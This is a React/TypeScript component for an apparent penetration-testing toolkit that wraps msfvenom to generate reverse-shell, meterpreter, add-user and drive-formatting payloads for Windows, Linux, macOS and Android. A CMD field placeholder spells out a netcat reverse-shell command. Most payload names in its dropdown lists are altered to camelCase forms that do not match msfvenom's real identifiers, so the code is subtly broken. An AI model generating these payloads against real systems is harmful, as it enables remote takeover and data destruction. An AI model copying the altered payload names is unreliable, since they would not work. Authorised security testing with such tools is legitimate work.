import { Button, LoadingOverlay, NativeSelect, Stack, Switch, TextInput } from "@mantine/core";
import { useForm } from "@mantine/form";
import { useCallback, useState, useEffect } from "react";
import { CommandHelper } from "../../utils/CommandHelper";
import ConsoleWrapper from "../ConsoleWrapper/ConsoleWrapper";
import { UserGuide } from "../UserGuide/UserGuide";
import { SaveOutputToTextFile_v2 } from "../SaveOutputToFile/SaveOutputToTextFile";
import { LoadingOverlayAndCancelButton } from "../OverlayAndCancelButton/OverlayAndCancelButton";
import { checkAllCommandsAvailability } from "../../utils/CommandAvailability";
import InstallationModal from "../InstallationModal/InstallationModal";
import { RenderComponent } from "../UserGuide/UserGuide";

/**
 * Represents the form values required for payload generation.
 */

// Form values interface
interface FormValuesType {
    lhost: string;
    lport: string;
    rhost: string;
    user: string;
    pass: string;
    text: string;
    url: string;
    cmd: string;
    dll: string;
    path: string;
    pe: string;
    pexec: string;
    file: string;
    mode: string;
    outputPath: string;
    custom: string;
}

/**
 * The msfvenom component.
 * @returns The msfvenom component.
 */

// Payload Options Configuration
const architectures = ["windows/x86", "windows/x64", "linux/x86", "Mac/x64", "Android ARM"];
const payloadOptions = [
    // Nested arrays of payload options

    // Options for windows/x86
    [
        "windows/meterpreter/reverseTcp",
        "windows/shellReverseTcp",
        "windows/exec",
        "windows/adduser",
        "windows/messageBox",
        "windows/formatAllDrives",
        "windows/loadLibrary",
        "windows/pingBackReverseTcp",
        "windows/speakPwned",
        "windows/upexec/bindTcp",
    ],
    // Options for windows/x64
    [
        "windows/x64/meterpreter/reverseTcp",
        "windows/x64/shellReverseTcp",
        "windows/x64/exec",
        "windows/x64/addUser",
        "windows/x64/messageBox",
        "windows/x64/loadLibrary",
        "windows/x64/peinject/bindTcp",
        "windows/x64/shell/bindNamedPipe",
    ],
    // Options for linux/x86
    [
        "linux/x86/meterpreter/reverseTcp",
        "linux/x86/shell_bindTcp",
        "linux/x86/exec",
        "linux/x86/shellFindTag",
        "linux/x86/addUser",
        "linux/x86/chmod",
        "linux/x86/readFile",
        "linux/x86/shellFindPort",
        "linux/x86/meterpreter/reverseIpv6Tcp",
    ],
    // Options for Mac/x64
    [
        "osx/x64/meterpreter/reverseHttps",
        "osx/x64/shellBindTcp",
        "osx/x64/exec",
        "osx/x64/say",
        "osx/x64/shellFindTag",
        "osx/x64/dupandexecve/bindTcp",
        "osx/x64/meterpreter/reverseTcp",
    ],
    // Options for Android ARM
    [
        "android/meterpreter/reverseHttps",
        "android/meterpreter/reverseTcp",
        "android/meterpreterReverseHttp",
        "android/meterpreterReverseHttps",
        "android/meterpreterReverseTcp",
        "android/shell/reverseHttp",
        "android/shell/reverseHttps",
        "android/shell/reverseTcp",
    ],
];

const payloadFormats = ["exe", "elf", "raw", "psh", "asp", "aspx", "jsp", "war", "jar"]; //Payload formats

const payloadRequiredVariables = [
    // windows x86 required payload variables
    [
        ["LHOST", "LPORT"],
        ["LHOST", "LPORT"],
        ["CMD"],
        ["USER", "PASS"],
        ["TEXT"],
        [],
        ["DLL"],
        ["LHOST", "LPORT"],
        [],
        ["PEXEC"],
    ],
    //windows x64 required payload variables
    [["LHOST", "LPORT"], ["LHOST", "LPORT"], ["CMD"], ["USER", "PASS"], ["TEXT"], ["DLL"], ["PE"], []],
    //linux x86 required payload variables
    [
        ["LHOST", "LPORT"],
        ["LPORT"],
        ["CMD"],
        ["LHOST", "LPORT"],
        ["USER", "PASS"],
        ["FILE", "MODE"],
        ["PATH"],
        [],
        ["LHOST", "LPORT"],
    ],
    //MAC x64 required payload variables
    [["LHOST", "LPORT"], ["LPORT"], ["CMD"], ["TEXT"], [], [], [], ["LHOST", "LPORT"]],
    //Android ARM required payload variables
    [
        ["LHOST", "LPORT"],
        ["LHOST", "LPORT"],
        ["LHOST", "LPORT"],
        ["LHOST", "LPORT"],
        ["LHOST", "LPORT"],
        ["LHOST", "LPORT"],
        ["LHOST", "LPORT"],
        ["LHOST", "LPORT"],
    ],
];

const PayloadGenerator = () => {
    // State variables
    const [loading, setLoading] = useState(false); // Indicates whether a process is currently loading
    const [output, setOutput] = useState(""); // Stores the output data from the process
    const [isCustomMode, setIsCustomMode] = useState(false); // Controls the custom mode toggle
    const [selectedArchitecture, setSelectedArchitecture] = useState(""); // Stores the selected architecture
    const [selectedPayload, setSelectedPayload] = useState(""); // Stores the selected payload
    const [isCommandAvailable, setIsCommandAvailable] = useState(false); // State variable to check if the command is available
    const [selectedFormat, setSelectedFormat] = useState(""); // Stores the selected payload format
    const [payloadIndex, setPayloadIndex] = useState<number | null>(null); // Stores the index of the selected payload
    const [opened, setOpened] = useState(!isCommandAvailable); // State variable to check if the installation modal is open
    const [allowSave, setAllowSave] = useState(false); // State variable to allow saving the output to a file
    const [hasSaved, setHasSaved] = useState(false); // State variable to indicate if the output has been saved
    const [loadingModal, setLoadingModal] = useState(true); // State variable to indicate loading state for the installation modal
    const [requiredVariables, setRequiredVariables] = useState<string[]>([]); // Stores the required variables for the selected payload
    const [pid, setPid] = useState(""); // Stores the process ID of the running command

    // Component Constants and Descriptions
    const title = "Payload Generator (msfvenom)"; // Component description
    const description =
        // Description of the component
        "Msfvenom is a payload generator and encoder that comes with the Metasploit Framework. " +
        "It allows you to create various types of payloads for exploitation. " +
        "Select the architecture, payload, and other options, then click Generate to create the payload.";
    const steps =
        "Step 1: Select an architecture, for example- windows/x64 and then select payload, for example- windows/x64/shellReverseTcp\n" +
        "Step 2: Select LHOST, LPORT and format of the payload\n" +
        "Step 3: Enter a desigred path where you want to save the file";
    const sourceLink = "https://www.kali.org/tools/metasploit-framework/#msfvenom"; // Link to the source code
    const tutorial = ""; // Link to the official documentation/tutorial.
    const dependencies = ["msfvenom"]; // Contains the dependencies required by the component

    // Form Management
    const form = useForm<FormValuesType>({
        // Initial form values
        initialValues: {
            lhost: "",
            lport: "",
            rhost: "",
            user: "",
            pass: "",
            text: "",
            url: "",
            cmd: "",
            dll: "",
            path: "",
            pe: "",
            pexec: "",
            outputPath: "",
            file: "",
            mode: "",
            custom: "",
        },
    });

    // Check the availability of all commands in the dependencies array.
    useEffect(() => {
        // Check if the command is available and set the state variables accordingly.
        checkAllCommandsAvailability(dependencies)
            .then((isAvailable) => {
                setIsCommandAvailable(isAvailable); // Set the command availability state
                setOpened(!isAvailable); // Set the modal state to opened if the command is not available
                setLoadingModal(false); // Set loading to false after the check is done
            })
            .catch((error) => {
                console.error("An error occurred:", error);
                setLoadingModal(false); // Also set loading to false in case of error
            });
    }, []);

    /** Uses the callback function of runCommandGetPidAndOutput to handle and save data
     *  generated by the executing process into the output state variable. */
    const handleProcessData = useCallback((data: string) => {
        setOutput((prevOutput) => prevOutput + "\n" + data); // Update output
    }, []);

    /** Uses the onTermination callback function of runCommandGetPidAndOutput to handle
     *  the termination of that process, resetting state variables, handling the output data,
     *  and informing the user. */
    const handleProcessTermination = useCallback(
        ({ code, signal }: { code: number; signal: number }) => {
            if (code === 0) {
                handleProcessData("\nProcess completed successfully."); // If the process was successful, display a success message
            } else if (signal === 15) {
                handleProcessData("\nProcess was manually terminated."); // If the process was terminated manually, display a termination message
            } else {
                handleProcessData(`\nProcess terminated with exit code: ${code} and signal code: ${signal}`); // If the process was terminated with an error, display the exit and signal codes
            }
            // Clear the child process pid reference
            setPid("");
            // Cancel the Loading Overlay
            setLoading(false);
        },
        [handleProcessData]
    );

    /**
     * handleSaveComplete: Recognizes that the output file has been saved.
     * Passes the saved status back to SaveOutputToTextFile_v2.
     */
    const handleSaveComplete = useCallback(() => {
        setHasSaved(true);
        setAllowSave(false);
    }, []);

    // Sends a SIGTERM signal to gracefully terminate the process
    const handleCancel = () => {
        if (pid !== null) {
            const args = [`-15`, pid];
            CommandHelper.runCommand("kill", args);
        }
    };
    /**
     * onSubmit: Asynchronous handler for the form submission event.
     * It sets up and triggers the msfvenom tool with the given parameters.
     * Once the command is executed, the results or errors are displayed in the output.
     * @param {FormValuesType} values - The form values, containing the lhost, lport, rhost, user, pass, text, url, cmd, dll,
     * path, pe, pexec, outputPath, file, mode and custom
     */
    const onSubmit = async () => {
        setLoading(true); // Set the loading state to true to indicate that the process is starting
        setAllowSave(false); // Disable saving the output to a file while the process is running
        const args = [];

        if (isCustomMode) {
            args.push(...form.values.custom.split(" "));
        } else {
            args.push("-p", selectedPayload); // User will select the desired payload

            if (form.values.lhost) {
                args.push(`LHOST=${form.values.lhost}`); // IP address of listening host
            }

            if (form.values.lport) {
                args.push(`LPORT=${form.values.lport}`); // Port number of listening host
            }

            if (form.values.rhost) {
                args.push(`RHOST=${form.values.rhost}`); // IP address of target host
            }

            if (form.values.user) {
                args.push(`USER=${form.values.user}`); // Add an username
            }

            if (form.values.pass) {
                args.push(`PASS=${form.values.pass}`); // Write the password
            }

            if (form.values.text) {
                args.push(`TEXT=${form.values.text}`); // Enter text
            }

            if (form.values.url) {
                args.push(`URL=${form.values.url}`); // Enter URL
            }

            if (form.values.cmd) {
                args.push(`CMD=${form.values.cmd}`); // Enter the command for generating payload
            }

            if (form.values.dll) {
                args.push(`DLL=${form.values.dll}`); // Enter the dll local path
            }

            if (form.values.path) {
                args.push(`PATH=${form.values.path}`); // Enter the path to the file
            }

            if (form.values.pexec) {
                args.push(`PEXEC=${form.values.pexec}`); // Enter the path to the exucatable file
            }

            if (form.values.pe) {
                args.push(`PE=${form.values.pe}`); // Enter the path to exucatable file
            }

            if (form.values.file) {
                args.push(`FILE=${form.values.file}`); // Enter path to file for chmod
            }

            if (form.values.mode) {
                args.push(`MODE=${form.values.mode}`); // Enter the chmod value
            }

            args.push("-f", selectedFormat);
        }
        args.push("-o", form.values.outputPath);

        try {
            // Execute the msfvenom command using the CommandHelper utility.
            // Pass the command name, arguments, and callback functions for handling process data and termination.
            const result = await CommandHelper.runCommandGetPidAndOutput(
                "msfvenom",
                args,
                handleProcessData,
                handleProcessTermination
            );
            // Update the state with the process ID and initial output.
            setPid(result.pid);
            setOutput(result.output);
        } catch (e: any) {
            setOutput(e.message); // If an error occurs during command execution, display the error message
            setAllowSave(true); // Allow saving the output (which includes the error message) to a file
        }
    };

    /**
     * Clears the output displayed to the user
     */
    const clearOutput = () => {
        setOutput("");
        setHasSaved(false);
        setAllowSave(false);
    };

    const architectureIndex = architectures.indexOf(selectedArchitecture);

    // JSX rendering and component composition
    return (
        // Render the UserGuide component with component details
        <RenderComponent
            title={title}
            description={description}
            steps={steps}
            tutorial={tutorial}
            sourceLink={sourceLink}
        >
            {!loadingModal && (
                <InstallationModal
                    isOpen={opened}
                    setOpened={setOpened}
                    feature_description={description}
                    dependencies={dependencies}
                ></InstallationModal>
            )}
            <form onSubmit={form.onSubmit(onSubmit)}>
                <LoadingOverlay visible={loading} />
                {loading && (
                    <div>
                        <Button variant="outline" color="red" style={{ zIndex: 1001 }} onClick={handleCancel}>
                            Cancel
                        </Button>
                    </div>
                )}

                <Stack>
                    {LoadingOverlayAndCancelButton(loading, pid)}

                    {/* Add the "Custom" switch */}
                    <Switch
                        label="Custom"
                        checked={isCustomMode}
                        onChange={() => {
                            setIsCustomMode(!isCustomMode);
                            setSelectedPayload(""); // Clear selected payload when switching modes
                        }}
                    />

                    {isCustomMode ? (
                        <TextInput
                            label="Custom Input"
                            placeholder="Enter your custom input, eg: -p windows/meterpreter/reverse_tcp -f exe LHOST= xxx.xxx.xxx.xxx LPORT= 1234"
                            {...form.getInputProps("custom")}
                            required
                        />
                    ) : (
                        <>
                            <NativeSelect
                                value={selectedArchitecture}
                                onChange={(e) => {
                                    setSelectedArchitecture(e.target.value);
                                    setSelectedPayload("");
                                }}
                                title="Select Architecture"
                                data={architectures}
                                required
                                placeholder="Select Architecture"
                            />

                            <NativeSelect
                                value={selectedPayload}
                                onChange={(e) => {
                                    setSelectedPayload(e.target.value);
                                    const newIndex = payloadOptions[architectureIndex].indexOf(e.target.value);
                                    setPayloadIndex(newIndex);
                                    setRequiredVariables(payloadRequiredVariables[architectureIndex][newIndex] || []);
                                }}
                                title="Select Payload"
                                data={payloadOptions[architectureIndex] || []}
                                required
                                placeholder="Select Payload"
                            />

                            {/* Render other inputs based on requiredVariables */}
                            {requiredVariables.includes("LHOST") && (
                                <TextInput
                                    label="LHOST"
                                    placeholder="Enter LHOST eg. 192.168.1.1"
                                    {...form.getInputProps("lhost")}
                                />
                            )}
                            {requiredVariables.includes("LPORT") && (
                                <TextInput
                                    label="LPORT"
                                    placeholder="Enter LPORT eg. 1335"
                                    {...form.getInputProps("lport")}
                                />
                            )}
                            {requiredVariables.includes("RHOST") && (
                                <TextInput
                                    label="RHOST"
                                    placeholder="Enter RHOST eg. 192.168.2.1"
                                    {...form.getInputProps("rhost")}
                                />
                            )}
                            {requiredVariables.includes("USER") && (
                                <TextInput label="USER" placeholder="Enter USERNAME" {...form.getInputProps("user")} />
                            )}
                            {requiredVariables.includes("PASS") && (
                                <TextInput label="PASS" placeholder="Enter PASSWORD" {...form.getInputProps("pass")} />
                            )}
                            {requiredVariables.includes("TEXT") && (
                                <TextInput
                                    label="TEXT"
                                    placeholder="Enter TEXT eg Hello World"
                                    {...form.getInputProps("text")}
                                />
                            )}
                            {requiredVariables.includes("URL") && (
                                <TextInput
                                    label="URL"
                                    placeholder="Enter URL eg. https://www.yoursite.com"
                                    {...form.getInputProps("url")}
                                />
                            )}
                            {requiredVariables.includes("CMD") && (
                                <TextInput
                                    label="CMD"
                                    placeholder="Enter CMD eg. nc -c /bin/sh 192.168.2.1 1234"
                                    {...form.getInputProps("cmd")}
                                />
                            )}
                            {requiredVariables.includes("DLL") && (
                                <TextInput
                                    label="DLL"
                                    placeholder="Enter DLL local path"
                                    {...form.getInputProps("dll")}
                                />
                            )}
                            {requiredVariables.includes("PATH") && (
                                <TextInput
                                    label="PATH"
                                    placeholder="Enter path to file"
                                    {...form.getInputProps("path")}
                                />
                            )}
                            {requiredVariables.includes("PE") && (
                                <TextInput
                                    label="PE"
                                    placeholder="Enter path to executable file for upload"
                                    {...form.getInputProps("pe")}
                                />
                            )}
                            {requiredVariables.includes("PEXEC") && (
                                <TextInput
                                    label="PEXEC"
                                    placeholder="Enter path to executable file for upload"
                                    {...form.getInputProps("pexec")}
                                />
                            )}
                            {requiredVariables.includes("FILE") && (
                                <TextInput
                                    label="FILE"
                                    placeholder="Enter path to file for chmod"
                                    {...form.getInputProps("file")}
                                />
                            )}
                            {requiredVariables.includes("MODE") && (
                                <TextInput
                                    label="MODE"
                                    placeholder="Enter chmod value (in octal)"
                                    {...form.getInputProps("mode")}
                                />
                            )}

                            <NativeSelect
                                value={selectedFormat}
                                onChange={(e) => setSelectedFormat(e.target.value)}
                                title="Select Format"
                                data={payloadFormats}
                                required
                                placeholder="Select Format"
                            />
                        </>
                    )}
                    <TextInput
                        label="Output Path"
                        placeholder="Enter output path/filename (no path defaults to src-tauri folder of DDT)"
                        {...form.getInputProps("outputPath")}
                    />

                    <Button type="submit">Generate</Button>
                    {SaveOutputToTextFile_v2(output, allowSave, hasSaved, handleSaveComplete)}
                    <ConsoleWrapper output={output} clearOutputCallback={clearOutput} />
                </Stack>
            </form>
        </RenderComponent>
    );
};

export default PayloadGenerator;
